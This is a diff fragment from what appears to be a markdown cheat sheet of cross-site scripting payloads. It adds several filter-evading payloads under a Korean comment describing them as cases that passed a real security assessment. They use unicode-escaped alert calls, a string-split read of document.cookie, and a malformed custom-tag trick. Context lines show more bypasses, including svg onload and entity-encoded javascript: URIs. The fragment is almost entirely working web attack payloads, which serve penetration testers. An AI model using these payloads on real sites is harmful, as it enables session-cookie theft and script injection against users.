@@ -293,6 +293,11 @@ fetch('/api/me', {credentials:'include'})
 <svg/onload=top['confirm'](document.domain)>
 <a href=java&#x73;cript:confirm(document.domain)>click</a>
 <a href=javascript:confirm(String.fromCharCode(88,83,83))>click</a>
+
+<!-- 실제 진단 통과 사례 -->
+<img src = “x” onerror=”\u0061lert(1)”>
+<img src="x" onerror="\u0061lert(this['ownerDoc'+'ument']['coo'+'kie'])">
+<x-script><!--alert(‘XSS 취약점 존재 !’)//-></x-script>
 ```
 
 ---
